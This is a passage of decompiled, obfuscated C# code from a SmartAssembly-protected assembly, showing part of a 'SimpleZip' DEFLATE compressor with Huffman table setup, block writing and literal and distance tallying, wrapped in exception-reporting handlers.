        {
          SmartAssembly.SmartUsageCore.DoNotPruneAttribute.ႰႣ();
          try
          {
            num1 = 16;
            while (true)
            {
              switch (num1)
              {
                case 0:
                  SimpleZip.ႤႠ.Ⴐ[index] = SimpleZip.ႤႠ.Ⴓ(256 + index << 7);
                  SimpleZip.ႤႠ.Ⴍ[index++] = (byte) 9;
                  num1 = 3;
                  continue;
                case 1:
                  goto label_23;
                case 2:
                  num1 = 3;
                  continue;
                case 3:
                  num1 = index < 256 ? 0 : 15;
                  continue;
                case 4:
                case 14:
                  num1 = 20;
                  continue;
                case 5:
                  SimpleZip.ႤႠ.Ⴃ[index] = SimpleZip.ႤႠ.Ⴓ(index << 11);
                  SimpleZip.ႤႠ.Ⴐ[index] = (byte) 5;
                  num1 = 10;
                  continue;
                case 6:
                  num1 = index < 144 ? 8 : 2;
                  continue;
                case 7:
                  SimpleZip.ႤႠ.Ⴐ = new short[286];
                  SimpleZip.ႤႠ.Ⴍ = new byte[286];
                  index = 0;
                  num1 = 6;
                  continue;
                case 8:
                  SimpleZip.ႤႠ.Ⴐ[index] = SimpleZip.ႤႠ.Ⴓ(48 + index << 8);
                  goto case 12;
                case 9:
                  SimpleZip.ႤႠ.Ⴐ[index] = SimpleZip.ႤႠ.Ⴓ(index - 256 << 9);
                  SimpleZip.ႤႠ.Ⴍ[index++] = (byte) 7;
                  num1 = 21;
                  continue;
                case 10:
                  ++index;
                  num1 = 17;
                  continue;
                case 11:
                  SimpleZip.ႤႠ.Ⴃ = new short[30];
                  SimpleZip.ႤႠ.Ⴐ = new byte[30];
                  index = 0;
                  num1 = 17;
                  continue;
                case 12:
                  SimpleZip.ႤႠ.Ⴍ[index++] = (byte) 8;
                  num1 = 6;
                  continue;
                case 15:
                  num1 = 21;
                  continue;
                case 17:
                  num1 = index < 30 ? 5 : 1;
                  continue;
                case 18:
                case 19:
                  SimpleZip.ႤႠ.Ⴐ[index] = SimpleZip.ႤႠ.Ⴓ(index - 88 << 8);
                  SimpleZip.ႤႠ.Ⴍ[index++] = (byte) 8;
                  num1 = 20;
                  continue;
                case 20:
                  num1 = index < 286 ? 18 : 11;
                  continue;
                case 21:
                  num1 = index < 280 ? 9 : 4;
                  continue;
                default:
                  int[] numArray1 = new int[19];
                  // ISSUE: field reference
                  UsageReportSender.Ⴀ((Array) numArray1, __fieldref (\u003CPrivateImplementationDetails\u003E.\u0024\u0024method0x600003b\u002D1), 392, 425);
                  SimpleZip.ႤႠ.Ⴗ = numArray1;
                  byte[] numArray2 = new byte[16];
                  // ISSUE: field reference
                  UsageReportSender.Ⴀ((Array) numArray2, __fieldref (\u003CPrivateImplementationDetails\u003E.\u0024\u0024method0x600003b\u002D2), 892, 861);
                  SimpleZip.ႤႠ.Ⴄ = numArray2;
                  num1 = 7;
                  continue;
              }
            }
          }
          catch (Exception ex)
          {
            // ISSUE: variable of a boxed type
            __Boxed<int> o1 = (ValueType) index;
            StackFrameHelper.CreateException1(ex, (object) o1);
            throw;
          }
label_23:
          switch (1)
          {
          }
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<int> o1 = (ValueType) index;
          // ISSUE: variable of a boxed type
          __Boxed<int> o2 = (ValueType) num1;
          int num2;
          // ISSUE: variable of a boxed type
          __Boxed<int> o3 = (ValueType) num2;
          StackFrameHelper.CreateException3(ex, (object) o1, (object) o2, (object) o3);
          throw;
        }
      }

      public ႤႠ(SimpleZip.ႤႼ Ⴈ)
      {
        short[] numArray1;
        byte[] numArray2;
        try
        {
          try
          {
            this.Ⴈ = Ⴈ;
            this.Ⴐ = new SimpleZip.ႤႠ.ႤႥ(this, 286, 257, 15);
            this.Ⴈ = new SimpleZip.ႤႠ.ႤႥ(this, 30, 1, 15);
            this.Ⴀ = new SimpleZip.ႤႠ.ႤႥ(this, 19, 4, 7);
            numArray1 = new short[16384];
            this.Ⴓ.Ⴅ = numArray1;
            numArray2 = new byte[16384];
            this.Ⴓ.Ⴗ = numArray2;
          }
          catch (Exception ex)
          {
            SimpleZip.ႤႼ o2 = Ⴈ;
            StackFrameHelper.CreateException2(ex, (object) this, (object) o2);
            throw;
          }
        }
        catch (Exception ex)
        {
          short[] o1 = numArray1;
          byte[] o2 = numArray2;
          SimpleZip.ႤႼ o4 = Ⴈ;
          StackFrameHelper.CreateException4(ex, (object) o1, (object) o2, (object) this, (object) o4);
          throw;
        }
      }

      public void Ⴗ()
      {
        int num1;
        int num2;
        try
        {
          try
          {
            num1 = 0;
            this.Ⴓ.Ⴃ = num1;
            num2 = 0;
            this.Ⴓ.Ⴄ = num2;
          }
          catch (Exception ex)
          {
            StackFrameHelper.CreateException1(ex, (object) this);
            throw;
          }
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<int> o1 = (ValueType) num1;
          // ISSUE: variable of a boxed type
          __Boxed<int> o2 = (ValueType) num2;
          StackFrameHelper.CreateException3(ex, (object) o1, (object) o2, (object) this);
          throw;
        }
      }

      private int Ⴈ(int Ⴗ)
      {
        int num1;
        int num2;
        try
        {
          int num3;
          try
          {
            num1 = 3;
            while (true)
            {
              switch (num1)
              {
                case 1:
                  goto label_3;
                case 2:
                  num1 = Ⴗ >= 8 ? 6 : 5;
                  continue;
                case 4:
                case 8:
                  num2 = 257;
                  num1 = 2;
                  continue;
                case 5:
                case 7:
                  goto label_7;
                case 6:
                  num2 += 4;
                  Ⴗ >>= 1;
                  num1 = 2;
                  continue;
                default:
                  num1 = Ⴗ != (int) byte.MaxValue ? 8 : 1;
                  continue;
              }
            }
label_3:
            num3 = 285;
            goto label_9;
label_7:
            num3 = num2 + Ⴗ;
          }
          catch (Exception ex)
          {
            // ISSUE: variable of a boxed type
            __Boxed<int> o1 = (ValueType) num2;
            // ISSUE: variable of a boxed type
            __Boxed<int> o3 = (ValueType) Ⴗ;
            StackFrameHelper.CreateException3(ex, (object) o1, (object) this, (object) o3);
            throw;
          }
label_9:
          return num3;
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<int> o1 = (ValueType) num2;
          int num4;
          // ISSUE: variable of a boxed type
          __Boxed<int> o2 = (ValueType) num4;
          // ISSUE: variable of a boxed type
          __Boxed<int> o3 = (ValueType) num1;
          // ISSUE: variable of a boxed type
          __Boxed<int> o5 = (ValueType) Ⴗ;
          StackFrameHelper.CreateException5(ex, (object) o1, (object) o2, (object) o3, (object) this, (object) o5);
          throw;
        }
      }

      private int Ⴀ(int Ⴍ)
      {
        int num1;
        int num2;
        try
        {
          int num3;
          try
          {
            num1 = 2;
            while (true)
            {
              switch (num1)
              {
                case 0:
                  goto label_8;
                case 1:
                case 4:
                  goto label_6;
                case 3:
                  num1 = Ⴍ >= 4 ? 5 : 4;
                  continue;
                case 5:
                  num2 += 2;
                  Ⴍ >>= 1;
                  num1 = 3;
                  continue;
                case 6:
                  num1 = 3;
                  continue;
                default:
                  num2 = 0;
                  goto case 6;
              }
            }
label_6:
            num3 = num2 + Ⴍ;
          }
          catch (Exception ex)
          {
            // ISSUE: variable of a boxed type
            __Boxed<int> o1 = (ValueType) num2;
            // ISSUE: variable of a boxed type
            __Boxed<int> o3 = (ValueType) Ⴍ;
            StackFrameHelper.CreateException3(ex, (object) o1, (object) this, (object) o3);
            throw;
          }
label_8:
          return num3;
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<int> o1 = (ValueType) num2;
          int num4;
          // ISSUE: variable of a boxed type
          __Boxed<int> o2 = (ValueType) num4;
          // ISSUE: variable of a boxed type
          __Boxed<int> o3 = (ValueType) num1;
          // ISSUE: variable of a boxed type
          __Boxed<int> o5 = (ValueType) Ⴍ;
          StackFrameHelper.CreateException5(ex, (object) o1, (object) o2, (object) o3, (object) this, (object) o5);
          throw;
        }
      }

      public void Ⴅ(int Ⴅ)
      {
        int num1;
        int index;
        try
        {
          try
          {
            num1 = 6;
            while (true)
            {
              switch (num1)
              {
                case 0:
                  index = 0;
                  num1 = 3;
                  continue;
                case 1:
                  ++index;
                  num1 = 3;
                  continue;
                case 2:
                  goto label_9;
                case 3:
                  num1 = index < Ⴅ ? 7 : 2;
                  continue;
                case 4:
                case 9:
                  this.Ⴈ.Ⴅ(this.Ⴈ.Ⴅ - 1, 5);
                  this.Ⴈ.Ⴅ(Ⴅ - 4, 4);
                  goto case 5;
                case 5:
                  num1 = 0;
                  continue;
                case 7:
                  this.Ⴈ.Ⴅ((int) this.Ⴀ.Ⴓ[SimpleZip.ႤႠ.Ⴗ[index]], 3);
                  num1 = 1;
                  continue;
                default:
                  this.Ⴀ.Ⴗ();
                  this.Ⴐ.Ⴗ();
                  this.Ⴈ.Ⴗ();
                  this.Ⴈ.Ⴅ(this.Ⴐ.Ⴅ - 257, 5);
                  num1 = 9;
                  continue;
              }
            }
label_9:
            this.Ⴐ.Ⴈ(this.Ⴀ);
            this.Ⴈ.Ⴈ(this.Ⴀ);
          }
          catch (Exception ex)
          {
            // ISSUE: variable of a boxed type
            __Boxed<int> o1 = (ValueType) index;
            // ISSUE: variable of a boxed type
            __Boxed<int> o3 = (ValueType) Ⴅ;
            StackFrameHelper.CreateException3(ex, (object) o1, (object) this, (object) o3);
            throw;
          }
          switch (4)
          {
          }
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<int> o1 = (ValueType) index;
          // ISSUE: variable of a boxed type
          __Boxed<int> o2 = (ValueType) num1;
          int num2;
          // ISSUE: variable of a boxed type
          __Boxed<int> o3 = (ValueType) num2;
          // ISSUE: variable of a boxed type
          __Boxed<int> o5 = (ValueType) Ⴅ;
          StackFrameHelper.CreateException5(ex, (object) o1, (object) o2, (object) o3, (object) this, (object) o5);
          throw;
        }
      }

      public void Ⴅ()
      {
        int num1;
        int index;
        int num2;
        int Ⴍ;
        int Ⴐ1;
        int Ⴄ;
        int Ⴐ2;
        try
        {
          try
          {
            num1 = 11;
            while (true)
            {
              switch (num1)
              {
                case 0:
                case 12:
                  num1 = Ⴍ-- == 0 ? 4 : 1;
                  continue;
                case 1:
                  Ⴐ1 = this.Ⴈ(num2);
                  this.Ⴐ.Ⴅ(Ⴐ1);
                  Ⴄ = (Ⴐ1 - 261) / 4;
                  num1 = 15;
                  continue;
                case 2:
                case 10:
                  this.Ⴈ.Ⴅ(num2 & (1 << Ⴄ) - 1, Ⴄ);
                  goto case 8;
                case 3:
                  num1 = index < this.Ⴓ.Ⴃ ? 9 : 7;
                  continue;
                case 4:
                  this.Ⴐ.Ⴅ(num2);
                  goto case 5;
                case 5:
                  ++index;
                  num1 = 3;
                  continue;
                case 7:
                  goto label_16;
                case 8:
                  Ⴐ2 = this.Ⴀ(Ⴍ);
                  this.Ⴈ.Ⴅ(Ⴐ2);
                  Ⴄ = Ⴐ2 / 2 - 1;
                  num1 = 17;
                  continue;
                case 9:
                  num2 = (int) this.Ⴓ.Ⴗ[index] & (int) byte.MaxValue;
                  Ⴍ = (int) this.Ⴓ.Ⴅ[index];
                  num1 = 12;
                  continue;
                case 13:
                  num1 = Ⴄ > 5 ? 8 : 2;
                  continue;
                case 14:
                  this.Ⴈ.Ⴅ(Ⴍ & (1 << Ⴄ) - 1, Ⴄ);
                  goto case 16;
                case 15:
                  num1 = Ⴄ <= 0 ? 8 : 13;
                  continue;
                case 16:
                  num1 = 5;
                  continue;
                case 17:
                  num1 = Ⴄ <= 0 ? 5 : 14;
                  continue;
                default:
                  index = 0;
                  num1 = 3;
                  continue;
              }
            }
label_16:
            this.Ⴐ.Ⴅ(256);
          }
          catch (Exception ex)
          {
            // ISSUE: variable of a boxed type
            __Boxed<int> o1 = (ValueType) index;
            // ISSUE: variable of a boxed type
            __Boxed<int> o2 = (ValueType) num2;
            // ISSUE: variable of a boxed type
            __Boxed<int> o3 = (ValueType) Ⴍ;
            // ISSUE: variable of a boxed type
            __Boxed<int> o4 = (ValueType) Ⴐ1;
            // ISSUE: variable of a boxed type
            __Boxed<int> o5 = (ValueType) Ⴄ;
            // ISSUE: variable of a boxed type
            __Boxed<int> o6 = (ValueType) Ⴐ2;
            StackFrameHelper.CreateException7(ex, (object) o1, (object) o2, (object) o3, (object) o4, (object) o5, (object) o6, (object) this);
            throw;
          }
          switch (2)
          {
          }
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<int> o1 = (ValueType) index;
          // ISSUE: variable of a boxed type
          __Boxed<int> o2 = (ValueType) num2;
          // ISSUE: variable of a boxed type
          __Boxed<int> o3 = (ValueType) Ⴍ;
          // ISSUE: variable of a boxed type
          __Boxed<int> o4 = (ValueType) Ⴐ1;
          // ISSUE: variable of a boxed type
          __Boxed<int> o5 = (ValueType) Ⴄ;
          // ISSUE: variable of a boxed type
          __Boxed<int> o6 = (ValueType) Ⴐ2;
          // ISSUE: variable of a boxed type
          __Boxed<int> o7 = (ValueType) num1;
          int num3;
          // ISSUE: variable of a boxed type
          __Boxed<int> o8 = (ValueType) num3;
          StackFrameHelper.CreateException9(ex, (object) o1, (object) o2, (object) o3, (object) o4, (object) o5, (object) o6, (object) o7, (object) o8, (object) this);
          throw;
        }
      }

      public void Ⴅ(byte[] Ⴃ, int Ⴅ, int Ⴍ, bool Ⴓ)
      {
        int num1;
        try
        {
          try
          {
            num1 = 4;
            while (true)
            {
              switch (num1)
              {
                case 1:
                case 3:
                  this.Ⴈ.Ⴈ(Ⴍ);
                  this.Ⴈ.Ⴈ(~Ⴍ);
                  num1 = 2;
                  continue;
                case 2:
                  goto label_4;
                default:
                  this.Ⴈ.Ⴅ(Ⴓ ? 1 : 0, 3);
                  this.Ⴈ.Ⴃ();
                  goto case 1;
              }
            }
label_4:
            this.Ⴈ.Ⴗ(Ⴃ, Ⴅ, Ⴍ);
            this.Ⴗ();
          }
          catch (Exception ex)
          {
            byte[] o2 = Ⴃ;
            // ISSUE: variable of a boxed type
            __Boxed<int> o3 = (ValueType) Ⴅ;
            // ISSUE: variable of a boxed type
            __Boxed<int> o4 = (ValueType) Ⴍ;
            // ISSUE: variable of a boxed type
            __Boxed<bool> o5 = (ValueType) Ⴓ;
            StackFrameHelper.CreateException5(ex, (object) this, (object) o2, (object) o3, (object) o4, (object) o5);
            throw;
          }
          switch (2)
          {
          }
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<int> o1 = (ValueType) num1;
          int num2;
          // ISSUE: variable of a boxed type
          __Boxed<int> o2 = (ValueType) num2;
          byte[] o4 = Ⴃ;
          // ISSUE: variable of a boxed type
          __Boxed<int> o5 = (ValueType) Ⴅ;
          // ISSUE: variable of a boxed type
          __Boxed<int> o6 = (ValueType) Ⴍ;
          // ISSUE: variable of a boxed type
          __Boxed<bool> o7 = (ValueType) Ⴓ;
          StackFrameHelper.CreateException7(ex, (object) o1, (object) o2, (object) this, (object) o4, (object) o5, (object) o6, (object) o7);
          throw;
        }
      }

      public void Ⴃ(byte[] Ⴃ, int Ⴓ, int Ⴗ, bool Ⴀ)
      {
        int num1;
        short[] ⴅ;
        int Ⴅ;
        int index1;
        int num2;
        int ⴄ;
        int index2;
        int index3;
        object[] objArray;
        try
        {
          try
          {
            num1 = 4;
            while (true)
            {
              switch (num1)
              {
                case 0:
                  num1 = 6;
                  continue;
                case 1:
                  ⴄ += (int) this.Ⴈ.Ⴅ[index3] * (int) SimpleZip.ႤႠ.Ⴐ[index3];
                  num1 = 8;
                  continue;
                case 2:
                  num1 = num2 < ⴄ ? 19 : 17;
                  continue;
                case 3:
                case 24:
                  num2 = 14 + Ⴅ * 3 + this.Ⴀ.Ⴈ() + this.Ⴐ.Ⴈ() + this.Ⴈ.Ⴈ() + this.Ⴓ.Ⴄ;
                  num1 = 20;
                  continue;
                case 5:
                  index3 = 0;
                  num1 = 21;
                  continue;
                case 6:
                  num1 = index2 < 286 ? 14 : 5;
                  continue;
                case 7:
                  num1 = index1 > Ⴅ ? 13 : 3;
                  continue;
                case 8:
                  ++index3;
                  num1 = 21;
                  continue;
                case 9:
                  ++index2;
                  num1 = 6;
                  continue;
                case 10:
                  this.Ⴐ.Ⴓ();
                  this.Ⴈ.Ⴓ();
                  this.Ⴐ.Ⴐ(this.Ⴀ);
                  num1 = 18;
                  continue;
                case 11:
                  goto label_24;
                case 12:
                  Ⴅ = index1 + 1;
                  num1 = 23;
                  continue;
                case 13:
                  num1 = this.Ⴀ.Ⴓ[SimpleZip.ႤႠ.Ⴗ[index1]] <= (byte) 0 ? 23 : 12;
                  continue;
                case 14:
                  ⴄ += (int) this.Ⴐ.Ⴅ[index2] * (int) SimpleZip.ႤႠ.Ⴍ[index2];
                  num1 = 9;
                  continue;
                case 15:
                  this.Ⴈ.Ⴅ(2 + (Ⴀ ? 1 : 0), 3);
                  this.Ⴐ.Ⴃ(SimpleZip.ႤႠ.Ⴐ, SimpleZip.ႤႠ.Ⴍ);
                  this.Ⴈ.Ⴃ(SimpleZip.ႤႠ.Ⴃ, SimpleZip.ႤႠ.Ⴐ);
                  num1 = 29;
                  continue;
                case 16:
                  goto label_28;
                case 17:
                  num2 = ⴄ;
                  num1 = 19;
                  continue;
                case 18:
                  this.Ⴈ.Ⴐ(this.Ⴀ);
                  this.Ⴀ.Ⴓ();
                  Ⴅ = 4;
                  num1 = 25;
                  continue;
                case 19:
                  num1 = Ⴓ < 0 ? 26 : 27;
                  continue;
                case 20:
                  ⴄ = this.Ⴓ.Ⴄ;
                  index2 = 0;
                  goto case 0;
                case 21:
                  num1 = index3 < 30 ? 1 : 2;
                  continue;
                case 23:
                case 28:
                  --index1;
                  num1 = 7;
                  continue;
                case 25:
                  index1 = 18;
                  num1 = 7;
                  continue;
                case 26:
                  num1 = num2 != ⴄ ? 16 : 15;
                  continue;
                case 27:
                  num1 = Ⴗ + 4 >= num2 >> 3 ? 26 : 11;
                  continue;
                case 29:
                  goto label_27;
                default:
                  (ⴅ = this.Ⴐ.Ⴅ)[256] = (short) ((int) ⴅ[256] + 1);
                  num1 = 10;
                  continue;
              }
            }
label_24:
            this.Ⴅ(Ⴃ, Ⴓ, Ⴗ, Ⴀ);
            goto label_30;
label_27:
            this.Ⴅ();
            this.Ⴗ();
            goto label_30;
label_28:
            this.Ⴈ.Ⴅ(4 + (Ⴀ ? 1 : 0), 3);
            this.Ⴅ(Ⴅ);
            this.Ⴅ();
            this.Ⴗ();
          }
          catch (Exception ex)
          {
            objArray = new object[12]
            {
              (object) Ⴅ,
              (object) index1,
              (object) num2,
              (object) ⴄ,
              (object) index2,
              (object) index3,
              (object) ⴅ,
              (object) this,
              (object) Ⴃ,
              (object) Ⴓ,
              (object) Ⴗ,
              (object) Ⴀ
            };
            object[] objects = objArray;
            StackFrameHelper.CreateExceptionN(ex, objects);
            throw;
          }
label_30:
          switch (2)
          {
          }
        }
        catch (Exception ex)
        {
          int num3;
          object[] objects = new object[15]
          {
            (object) Ⴅ,
            (object) index1,
            (object) num2,
            (object) ⴄ,
            (object) index2,
            (object) index3,
            (object) ⴅ,
            (object) objArray,
            (object) num1,
            (object) num3,
            (object) this,
            (object) Ⴃ,
            (object) Ⴓ,
            (object) Ⴗ,
            (object) Ⴀ
          };
          StackFrameHelper.CreateExceptionN(ex, objects);
          throw;
        }
      }

      public bool Ⴍ()
      {
        try
        {
          bool flag;
          try
          {
            flag = this.Ⴓ.Ⴃ >= 16384;
          }
          catch (Exception ex)
          {
            StackFrameHelper.CreateException1(ex, (object) this);
            throw;
          }
          return flag;
        }
        catch (Exception ex)
        {
          bool flag;
          // ISSUE: variable of a boxed type
          __Boxed<bool> o1 = (ValueType) flag;
          StackFrameHelper.CreateException2(ex, (object) o1, (object) this);
          throw;
        }
      }

      public bool Ⴐ(int Ⴗ)
      {
        int num1;
        int ⴃ;
        int num2;
        short[] ⴅ;
        IntPtr index1;
        bool flag;
        try
        {
          try
          {
            num1 = 7;
            while (true)
            {
              switch (num1)
              {
                case 0:
                  (ⴅ = this.Ⴐ.Ⴅ)[(int) (index1 = (IntPtr) Ⴗ)] = (short) ((int) ⴅ[index1] + 1);
                  goto case 3;
                case 1:
                case 2:
                  byte[] ⴗ = this.Ⴓ.Ⴗ;
                  SimpleZip.ႤႠ ⴄⴀ = this;
                  num2 = (ⴃ = ⴄⴀ.Ⴓ.Ⴃ) + 1;
                  ⴄⴀ.Ⴓ.Ⴃ = num2;
                  int index2 = ⴃ;
                  int num3 = (int) (byte) Ⴗ;
                  ⴗ[index2] = (byte) num3;
                  num1 = 0;
                  continue;
                case 3:
                case 5:
                  num1 = 6;
                  continue;
                case 6:
                  goto label_6;
                default:
                  this.Ⴓ.Ⴅ[this.Ⴓ.Ⴃ] = (short) 0;
                  num1 = 1;
                  continue;
              }
            }
label_6:
            flag = this.Ⴍ();
          }
          catch (Exception ex)
          {
            // ISSUE: variable of a boxed type
            __Boxed<int> o1 = (ValueType) ⴃ;
            short[] o2 = ⴅ;
            // ISSUE: variable of a boxed type
            __Boxed<IntPtr> o3 = (ValueType) index1;
            // ISSUE: variable of a boxed type
            __Boxed<int> o5 = (ValueType) Ⴗ;
            StackFrameHelper.CreateException5(ex, (object) o1, (object) o2, (object) o3, (object) this, (object) o5);
            throw;
          }
          switch (0)
          {
            default:
              return flag;
          }
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<int> o1 = (ValueType) ⴃ;
          short[] o2 = ⴅ;
          // ISSUE: variable of a boxed type
          __Boxed<IntPtr> o3 = (ValueType) index1;
          // ISSUE: variable of a boxed type
          __Boxed<bool> o4 = (ValueType) flag;
          // ISSUE: variable of a boxed type
          __Boxed<int> o5 = (ValueType) num2;
          // ISSUE: variable of a boxed type
          __Boxed<int> o6 = (ValueType) num1;
          int num4;
          // ISSUE: variable of a boxed type
          __Boxed<int> o7 = (ValueType) num4;
          // ISSUE: variable of a boxed type
          __Boxed<int> o9 = (ValueType) Ⴗ;
          StackFrameHelper.CreateException9(ex, (object) o1, (object) o2, (object) o3, (object) o4, (object) o5, (object) o6, (object) o7, (object) this, (object) o9);
          throw;
        }
      }

      public bool Ⴃ(int Ⴃ, int Ⴀ)
      {
        int num1;
        int ⴃ;
        int num2;
        int num3;
        short[] ⴅ;
        IntPtr index1;
        int num4;
        int num5;
        int num6;
        bool flag;
        try
        {
          try
          {
            num1 = 11;
            while (true)
            {
              switch (num1)
              {
                case 0:
                case 6:
                  num1 = num5 < 4 ? 5 : 12;
                  continue;
                case 1:
                  num1 = 10;
                  continue;
                case 3:
                  num3 = this.Ⴈ(Ⴀ - 3);
                  (ⴅ = this.Ⴐ.Ⴅ)[(int) (index1 = (IntPtr) num3)] = (short) ((int) ⴅ[index1] + 1);
                  num1 = 9;
                  continue;
                case 4:
                case 7:
                  num5 = this.Ⴀ(Ⴃ - 1);
                  (ⴅ = this.Ⴈ.Ⴅ)[(int) (index1 = (IntPtr) num5)] = (short) ((int) ⴅ[index1] + 1);
                  num1 = 0;
                  continue;
                case 5:
                  goto label_12;
                case 8:
                  SimpleZip.ႤႠ ⴄⴀ1 = this;
                  num4 = ⴄⴀ1.Ⴓ.Ⴄ + (num3 - 261) / 4;
                  ⴄⴀ1.Ⴓ.Ⴄ = num4;
                  num1 = 7;
                  continue;
                case 9:
                  num1 = num3 < 265 ? 7 : 13;
                  continue;
                case 10:
                  byte[] ⴗ = this.Ⴓ.Ⴗ;
                  SimpleZip.ႤႠ ⴄⴀ2 = this;
                  num2 = (ⴃ = ⴄⴀ2.Ⴓ.Ⴃ) + 1;
                  ⴄⴀ2.Ⴓ.Ⴃ = num2;
                  int index2 = ⴃ;
                  int num7 = (int) (byte) (Ⴀ - 3);
                  ⴗ[index2] = (byte) num7;
                  num1 = 3;
                  continue;
                case 12:
                  SimpleZip.ႤႠ ⴄⴀ3 = this;
                  num6 = ⴄⴀ3.Ⴓ.Ⴄ + (num5 / 2 - 1);
                  ⴄⴀ3.Ⴓ.Ⴄ = num6;
                  num1 = 5;
                  continue;
                case 13:
                  num1 = num3 >= 285 ? 7 : 8;
                  continue;
                default:
                  this.Ⴓ.Ⴅ[this.Ⴓ.Ⴃ] = (short) Ⴃ;
                  goto case 1;
              }
            }
label_12:
            flag = this.Ⴍ();
          }
          catch (Exception ex)
          {
            // ISSUE: variable of a boxed type
            __Boxed<int> o1 = (ValueType) num3;
            // ISSUE: variable of a boxed type
            __Boxed<int> o2 = (ValueType) num5;
            // ISSUE: variable of a boxed type
            __Boxed<int> o3 = (ValueType) ⴃ;
            short[] o4 = ⴅ;
            // ISSUE: variable of a boxed type
            __Boxed<IntPtr> o5 = (ValueType) index1;
            // ISSUE: variable of a boxed type
            __Boxed<int> o7 = (ValueType) Ⴃ;
            // ISSUE: variable of a boxed type
            __Boxed<int> o8 = (ValueType) Ⴀ;
            StackFrameHelper.CreateException8(ex, (object) o1, (object) o2, (object) o3, (object) o4, (object) o5, (object) this, (object) o7, (object) o8);
            throw;
          }
          switch (3)
          {
            default:
              return flag;
          }
        }
        catch (Exception ex)
        {
          int num8;
          object[] objects = new object[14]
          {
            (object) num3,
            (object) num5,
            (object) ⴃ,
            (object) ⴅ,
            (object) index1,
            (object) flag,
            (object) num2,
            (object) num4,
            (object) num6,
            (object) num1,
            (object) num8,
            (object) this,
            (object) Ⴃ,
            (object) Ⴀ
          };
          StackFrameHelper.CreateExceptionN(ex, objects);
          throw;
        }
      }

      public sealed class ႤႥ
      {
        public short[] Ⴅ;
        public byte[] Ⴓ;
        public int Ⴈ;
        public int Ⴅ;
        private SimpleZip.ႤႠ Ⴃ;
        private SmartAssembly.SmartExceptionsCore.DoNotObfuscateAttribute.Ⴀ Ⴄ;

        public ႤႥ(SimpleZip.ႤႠ Ⴍ, int Ⴈ, int Ⴓ, int Ⴃ)
        {
          int num;
          int[] numArray;
          try
          {
            try
            {
              this.Ⴃ = Ⴍ;
              this.Ⴈ = Ⴓ;
              num = Ⴃ;
              this.Ⴄ.Ⴅ = num;
              this.Ⴅ = new short[Ⴈ];
              numArray = new int[Ⴃ];
              this.Ⴄ.Ⴍ = numArray;
            }
            catch (Exception ex)
            {
              SimpleZip.ႤႠ o2 = Ⴍ;
              // ISSUE: variable of a boxed type
              __Boxed<int> o3 = (ValueType) Ⴈ;
              // ISSUE: variable of a boxed type
              __Boxed<int> o4 = (ValueType) Ⴓ;
              // ISSUE: variable of a boxed type
              __Boxed<int> o5 = (ValueType) Ⴃ;
              StackFrameHelper.CreateException5(ex, (object) this, (object) o2, (object) o3, (object) o4, (object) o5);
              throw;
            }
          }
          catch (Exception ex)
          {
            // ISSUE: variable of a boxed type
            __Boxed<int> o1 = (ValueType) num;
            int[] o2 = numArray;
            SimpleZip.ႤႠ o4 = Ⴍ;
            // ISSUE: variable of a boxed type
            __Boxed<int> o5 = (ValueType) Ⴈ;
            // ISSUE: variable of a boxed type
            __Boxed<int> o6 = (ValueType) Ⴓ;
            // ISSUE: variable of a boxed type
            __Boxed<int> o7 = (ValueType) Ⴃ;
            StackFrameHelper.CreateException7(ex, (object) o1, (object) o2, (object) this, (object) o4, (object) o5, (object) o6, (object) o7);
            throw;
          }
        }

        public void Ⴅ(int Ⴐ)
        {
          try
          {
            try
            {
              this.Ⴃ.Ⴈ.Ⴅ((int) this.Ⴄ.Ⴗ[Ⴐ] & (int) ushort.MaxValue, (int) this.Ⴓ[Ⴐ]);
            }
            catch (Exception ex)
            {
              // ISSUE: variable of a boxed type
              __Boxed<int> o2 = (ValueType) Ⴐ;
              StackFrameHelper.CreateException2(ex, (object) this, (object) o2);
              throw;
            }
          }
          catch (Exception ex)
          {
            // ISSUE: variable of a boxed type
            __Boxed<int> o2 = (ValueType) Ⴐ;
            StackFrameHelper.CreateException2(ex, (object) this, (object) o2);
            throw;
          }
        }

        public void Ⴃ(short[] Ⴃ, byte[] Ⴈ)
        {
          short[] numArray;
          try
          {
            try
            {
              numArray = Ⴃ;
              this.Ⴄ.Ⴗ = numArray;
              this.Ⴓ = Ⴈ;
            }
            catch (Exception ex)
            {
              short[] o2 = Ⴃ;
              byte[] o3 = Ⴈ;
              StackFrameHelper.CreateException3(ex, (object) this, (object) o2, (object) o3);
              throw;
            }
          }
          catch (Exception ex)
          {
            short[] o1 = numArray;
            short[] o3 = Ⴃ;
            byte[] o4 = Ⴈ;
            StackFrameHelper.CreateException4(ex, (object) o1, (object) this, (object) o3, (object) o4);
            throw;
          }
        }

        public void Ⴗ()
        {
          int num1;
          int[] numArray1;
          int num2;
          short[] numArray2;
          int index1;
          int index2;
          int num3;
          int[] numArray3;
          IntPtr index3;
          try
          {
            try
            {
              num1 = 9;
              while (true)
              {
                switch (num1)
                {
                  case 0:
                    index2 = 0;
                    num1 = 7;
                    continue;
                  case 1:
                  case 11:
                    (numArray3 = numArray1)[(int) (index3 = (IntPtr) (num3 - 1))] = numArray3[index3] + (1 << 16 - num3);
                    num1 = 4;
                    continue;
                  case 2:
                    num1 = 13;
                    continue;
                  case 4:
                    ++index2;
                    num1 = 7;
                    continue;
                  case 5:
                  case 16:
                    num3 = (int) this.Ⴓ[index2];
                    num1 = num3 <= 0 ? 4 : 10;
                    continue;
                  case 6:
                    goto label_17;
                  case 7:
                    num1 = index2 < this.Ⴅ ? 5 : 6;
                    continue;
                  case 8:
                    index1 = 0;
                    num1 = 15;
                    continue;
                  case 10:
                    this.Ⴄ.Ⴗ[index2] = SimpleZip.ႤႠ.Ⴓ(numArray1[num3 - 1]);
                    num1 = 11;
                    continue;
                  case 12:
                    numArray1[index1] = num2;
                    num2 += this.Ⴄ.Ⴍ[index1] << 15 - index1;
                    num1 = 14;
                    continue;
                  case 13:
                    num2 = 0;
                    numArray2 = new short[this.Ⴅ.Length];
                    this.Ⴄ.Ⴗ = numArray2;
                    num1 = 8;
                    continue;
                  case 14:
                    ++index1;
                    num1 = 15;
                    continue;
